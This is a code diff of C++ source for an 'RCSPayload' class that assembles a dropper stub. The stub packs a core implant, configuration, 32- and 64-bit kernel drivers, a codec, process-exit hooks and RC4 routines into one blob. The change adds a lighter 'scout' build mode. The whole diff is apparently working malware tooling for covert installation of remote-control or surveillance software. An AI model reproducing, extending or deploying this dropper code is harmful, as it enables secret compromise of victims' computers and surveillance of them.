@@ -18,121 +18,166 @@ extern std::string productVersion;
 
 #define OFFSET(x) do { *((DWORD*) x) = offset_(x); x += sizeof(DWORD); } while(0)
 
-RCSPayload::RCSPayload( RCSConfig& rcs, Components& components )
+RCSPayload::RCSPayload( RCSConfig& rcs, Components& components, BOOL bScout )
 : rcs_(rcs), components_(components), cookedSize_(0)
 {
-	cout << endl;
-	cout << "Building dropper stub with following configuration" << endl;
-	cout << endl;
-	
-	cout << "Core (32bit)   : " << rcs_.core() << endl;
-	cout << "Core (64bit)   : " << (rcs_.core64().empty() ? "none" : rcs_.core64()) << endl;
-	cout << "Config         : " << rcs_.config() << endl;
-	cout << "Driver (32bit) : " << (rcs_.driver().empty() ? "none" : rcs_.driver()) << endl;
-	cout << "Driver (64bit) : " << (rcs_.driver64().empty() ? "none" : rcs_.driver64()) << endl;
-	cout << "Codec          : " << rcs_.codec() << endl;
-	cout << "Install dir    : " << rcs_.directory() << endl;
-	cout << "Manifest       : " << ( rcs_.manifest() ? "true" : "false" ) << endl;
-	cout << "Installer		: " << (rcs_.installer() ? "true" : "false" ) << endl;
-	
-	cout << endl;
-	
-	cout << "Core (32bit) size   : " << setw(8) << right << rcs_.core_size() << " bytes" << endl; 
-	cout << "Core (64bit) size   : " << setw(8) << right << rcs_.core64_size() << " bytes" << endl;
-	cout << "Config size         : " << setw(8) << right << rcs_.config_size() << " bytes" << endl;
-	cout << "Driver (32bit) size : " << setw(8) << right << rcs_.driver_size() << " bytes" << endl;
-	cout << "Driver (64bit) size : " << setw(8) << right << rcs_.driver64_size() << " bytes" << endl;
-	cout << "Codec size          : " << setw(8) << right << rcs_.codec_size() << " bytes" << endl;
-	
-	cout << endl;
-	
-	unsigned int buffer_size = 
-		alignToDWORD( sizeof(DropperHeader) )
-		+ rcs_.core_size()
-		+ rcs_.core64_size()
-		+ rcs_.config_size()
-		+ rcs_.driver_size()
-		+ rcs_.driver64_size()
-		+ rcs_.codec_size()
-		+ 69535; // account for strings, etc.
-	
-	cooked_.reset( new char[buffer_size] );
-	
-	char* ptr = cooked_.get();
-	cout << __FUNCTION__ << " BASE ptr: 0x" << hex << (DWORD)ptr << endl;
-	
-	// HEADER
-	DropperHeader* header = (DropperHeader*) ptr;
-	memset(header, 0, sizeof(DropperHeader));
-	ptr += sizeof(DropperHeader);
-	cout << __FUNCTION__ << " HEADER ptr: 0x" << hex << (DWORD)ptr << endl;
-	
-	// HEADER -> cooker version
-	memcpy(&header->version, productVersion.c_str(), productVersion.length() + 1);
-	
-	// MARKER
-	DWORD offset = sizeof(DropperHeader);
-	header->offsetToHeader = offset;
-	
-	END_MARKER(&header->headerEndMarker);
-	
-	// DROPPER CODE
-	
-	// entry point must always be the first function copied
-	if (!rcs_.installer())
+	if (!bScout)
 	{
-		ptr += embedFunction_(components.entryPoint(), header->functions.entryPoint, ptr);
-		ptr += embedFunction_(components.coreThread(), header->functions.coreThread, ptr);
-		ptr += embedFunction_(components.dumpFile(), header->functions.dumpFile, ptr);
-		OFFSET(ptr);
-		END_MARKER_AND_INCREMENT_PTR(ptr);
-		ptr += embedFunction_(components.hookCall(), header->functions.hookCall, ptr);
+		cout << endl;
+		cout << "Building dropper stub with following configuration" << endl;
+		cout << endl;
+
+		cout << "Core (32bit)   : " << rcs_.core() << endl;
+		cout << "Core (64bit)   : " << (rcs_.core64().empty() ? "none" : rcs_.core64()) << endl;
+		cout << "Config         : " << rcs_.config() << endl;
+		cout << "Driver (32bit) : " << (rcs_.driver().empty() ? "none" : rcs_.driver()) << endl;
+		cout << "Driver (64bit) : " << (rcs_.driver64().empty() ? "none" : rcs_.driver64()) << endl;
+		cout << "Codec          : " << rcs_.codec() << endl;
+		cout << "Install dir    : " << rcs_.directory() << endl;
+		cout << "Manifest       : " << ( rcs_.manifest() ? "true" : "false" ) << endl;
+		cout << "Installer		: " << (rcs_.installer() ? "true" : "false" ) << endl;
+
+		cout << endl;
+
+		cout << "Core (32bit) size   : " << setw(8) << right << rcs_.core_size() << " bytes" << endl; 
+		cout << "Core (64bit) size   : " << setw(8) << right << rcs_.core64_size() << " bytes" << endl;
+		cout << "Config size         : " << setw(8) << right << rcs_.config_size() << " bytes" << endl;
+		cout << "Driver (32bit) size : " << setw(8) << right << rcs_.driver_size() << " bytes" << endl;
+		cout << "Driver (64bit) size : " << setw(8) << right << rcs_.driver64_size() << " bytes" << endl;
+		cout << "Codec size          : " << setw(8) << right << rcs_.codec_size() << " bytes" << endl;
+
+		cout << endl;
+
+		unsigned int buffer_size = 
+			alignToDWORD( sizeof(DropperHeader) )
+			+ rcs_.core_size()
+			+ rcs_.core64_size()
+			+ rcs_.config_size()
+			+ rcs_.driver_size()
+			+ rcs_.driver64_size()
+			+ rcs_.codec_size()
+			+ 69535; // account for strings, etc.
+
+		cooked_.reset( new char[buffer_size] );
+
+		char* ptr = cooked_.get();
+		cout << __FUNCTION__ << " BASE ptr: 0x" << hex << (DWORD)ptr << endl;
+
+		// HEADER
+		DropperHeader* header = (DropperHeader*) ptr;
+		memset(header, 0, sizeof(DropperHeader));
+		ptr += sizeof(DropperHeader);
+		cout << __FUNCTION__ << " HEADER ptr: 0x" << hex << (DWORD)ptr << endl;
+
+		// HEADER -> cooker version
+		memcpy(&header->version, productVersion.c_str(), productVersion.length() + 1);
+
+		// MARKER
+		DWORD offset = sizeof(DropperHeader);
+		header->offsetToHeader = offset;
+
+		END_MARKER(&header->headerEndMarker);
+
+		// DROPPER CODE
+
+		// entry point must always be the first function copied
+		if (!rcs_.installer())
+		{
+			ptr += embedFunction_(components.entryPoint(), header->functions.entryPoint, ptr);
+			ptr += embedFunction_(components.coreThread(), header->functions.coreThread, ptr);
+			ptr += embedFunction_(components.dumpFile(), header->functions.dumpFile, ptr);
+			OFFSET(ptr);
+			END_MARKER_AND_INCREMENT_PTR(ptr);
+			ptr += embedFunction_(components.hookCall(), header->functions.hookCall, ptr);
+			OFFSET(ptr);
+			END_MARKER_AND_INCREMENT_PTR(ptr);
+			ptr += embedFunction_(components.exitProcess(), header->functions.exitProcessHook, ptr);
+			OFFSET(ptr);
+			END_MARKER_AND_INCREMENT_PTR(ptr);
+			ptr += embedFunction_(components.exit(), header->functions.exitHook, ptr);
+			ptr += embedFunction_(components.rc4(), header->functions.rc4, ptr);
+		}
+
+		// RCS FILES
+
+		ptr += embedFile_(rcs.core(), header->files.names.core, header->files.core, ptr );
+		ptr += embedFile_(rcs.config(), header->files.names.config, header->files.config, ptr );
+		if ( rcs_.core64_size() ) {
+			ptr += embedFile_(rcs.core64(), header->files.names.core64, header->files.core64, ptr );
+		}
+		if ( rcs_.codec_size() ) {
+			ptr += embedFile_(rcs.codec(), header->files.names.codec, header->files.codec, ptr );
+		}
+
+		if ( rcs_.driver_size() ) 
+		{
+			if ( rcs_.driver().filename() != string("none"))
+				//if ( strcmp(rcs_.driver().filename().com .c_str(), "null") )
+				ptr += embedFile_(rcs.driver(), header->files.names.driver, header->files.driver, ptr );
+		}
+
+
+		if (rcs_.driver64_size() ) 
+		{
+			if ( rcs_.driver64().filename() != string("none"))
+				//if ( strcmp(rcs_.driver64().filename().c_str(), "null") )
+				ptr += embedFile_(rcs.driver64(), header->files.names.driver64, header->files.driver64, ptr );
+		}
+
+
+		// DLL CALLS
+
+		ptr += embedDllCalls_(header, ptr);
+
+		// STRINGS
+
+		ptr += embedStrings_(rcs, header, ptr);
+
+		cookedSize_ = ptr - cooked_.get();
+		cout << __FUNCTION__ << " cooked size: " << cookedSize_ << endl;
+	}
+	else // scout
+	{
+		cout << "Building dropper stub for scout" << endl;
+		unsigned int buffer_size = 
+			alignToDWORD( sizeof(DropperHeader) )
+			+ rcs_.core_size()
+			+ 69535; // account for strings, etc.
+
+		cooked_.reset( new char[buffer_size] );
+		char* ptr = cooked_.get();
+		cout << __FUNCTION__ << " BASE ptr: 0x" << hex << (DWORD)ptr << endl;
+
+		// HEADER
+		DropperHeader* header = (DropperHeader*) ptr;
+		memset(header, 0, sizeof(DropperHeader));
+		ptr += sizeof(DropperHeader);
+		cout << __FUNCTION__ << " HEADER ptr: 0x" << hex << (DWORD)ptr << endl;
+		cout << __FUNCTION__ << " HEADER size: 0x" << hex << sizeof(DropperHeader) << endl;
+
+		// HEADER -> cooker version
+		memcpy(&header->version, productVersion.c_str(), productVersion.length() + 1);
+
+		// MARKER
+		DWORD offset = sizeof(DropperHeader);
+		header->offsetToHeader = offset;
+
+		END_MARKER(&header->headerEndMarker);
+
+		ptr += embedFunction_(components.entryPoint(), header->functions.entryPoint, ptr); 
+		ptr += embedFunction_(components.dumpFile(), header->functions.dumpFile, ptr); // ExtractFile
 		OFFSET(ptr);
 		END_MARKER_AND_INCREMENT_PTR(ptr);
 		ptr += embedFunction_(components.exitProcess(), header->functions.exitProcessHook, ptr);
-		OFFSET(ptr);
-		END_MARKER_AND_INCREMENT_PTR(ptr);
-		ptr += embedFunction_(components.exit(), header->functions.exitHook, ptr);
 		ptr += embedFunction_(components.rc4(), header->functions.rc4, ptr);
-	}
-	
-	// RCS FILES
-	
-	ptr += embedFile_(rcs.core(), header->files.names.core, header->files.core, ptr );
-	ptr += embedFile_(rcs.config(), header->files.names.config, header->files.config, ptr );
-	if ( rcs_.core64_size() ) {
-		ptr += embedFile_(rcs.core64(), header->files.names.core64, header->files.core64, ptr );
-	}
-	if ( rcs_.codec_size() ) {
-		ptr += embedFile_(rcs.codec(), header->files.names.codec, header->files.codec, ptr );
-	}
+		ptr += embedFunction_(components.load(), header->functions.load, ptr);
 
-	if ( rcs_.driver_size() ) 
-	{
-		if ( rcs_.driver().filename() != string("none"))
-		//if ( strcmp(rcs_.driver().filename().com .c_str(), "null") )
-			ptr += embedFile_(rcs.driver(), header->files.names.driver, header->files.driver, ptr );
-	}
+		ptr += embedFile_(rcs.core(), header->files.names.core, header->files.core, ptr);
+		//ptr += embedDllCalls_(header, ptr);
 
-	
-	if (rcs_.driver64_size() ) 
-	{
-		if ( rcs_.driver64().filename() != string("none"))
-		//if ( strcmp(rcs_.driver64().filename().c_str(), "null") )
-			ptr += embedFile_(rcs.driver64(), header->files.names.driver64, header->files.driver64, ptr );
+		cookedSize_ = ptr - cooked_.get();
+		cout << __FUNCTION__ << " cooked size: " << cookedSize_ << endl;
 	}
-	
-	
-	// DLL CALLS
-	
-	ptr += embedDllCalls_(header, ptr);
-		
-	// STRINGS
-	
-	ptr += embedStrings_(rcs, header, ptr);
-		
-	cookedSize_ = ptr - cooked_.get();
-	cout << __FUNCTION__ << " cooked size: " << cookedSize_ << endl;
 }
 
 std::size_t RCSPayload::embedFunction_( const DataBuffer& source, DataSectionBlob& func, char *ptr )
